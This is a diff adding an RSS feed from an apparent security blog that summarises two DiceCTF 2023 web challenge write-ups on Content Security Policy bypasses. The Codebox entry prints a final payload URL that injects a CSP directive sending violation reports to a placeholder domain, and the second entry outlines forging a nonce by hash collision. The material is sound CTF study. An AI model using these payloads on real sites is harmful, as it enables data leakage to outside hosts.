@@ -1,0 +1,12 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>csp - Tag - My Blog</title><link>http://r0h1t.me/blog/tags/csp/</link><description>csp - Tag - My Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>rohitnanu.m@gmail.com (Rohit)</managingEditor><webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 08 Feb 2023 00:00:00 +0530</lastBuildDate><atom:link href="http://r0h1t.me/blog/tags/csp/" rel="self" type="application/rss+xml"/><item><title>Codebox - DiceCTF 2023</title><link>http://r0h1t.me/blog/posts/codebox/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/codebox/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
+    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
+<li>Use img src to inject csp</li>
+<li>Use <code>report-uri your-domain</code> to get csp violation reports</li>
+<li>Use <code>require-trusted-types-for 'script'</code> to get violation when <code>innerHTML</code> is set</li>
+<li>Use <code>code=&amp;code&lt;payload&gt;</code> to make code undefined in front end</li>
+</ul>
+<p>Final Payload: <code>https://codebox.mc.ax/?code=&amp;code=&lt;img+src=&quot;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&quot;+&gt;</code></p>]]></description></item><item><title>Recursive-csp - DiceCTF 2023</title><link>http://r0h1t.me/blog/posts/rescursive-csp/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/rescursive-csp/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
+    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
+<li>Craft a payload with a random nonce</li>
+<li>Use something like hash-collider to collide the nonce we gave earlier</li>
+</ul>]]></description></item></channel></rss>
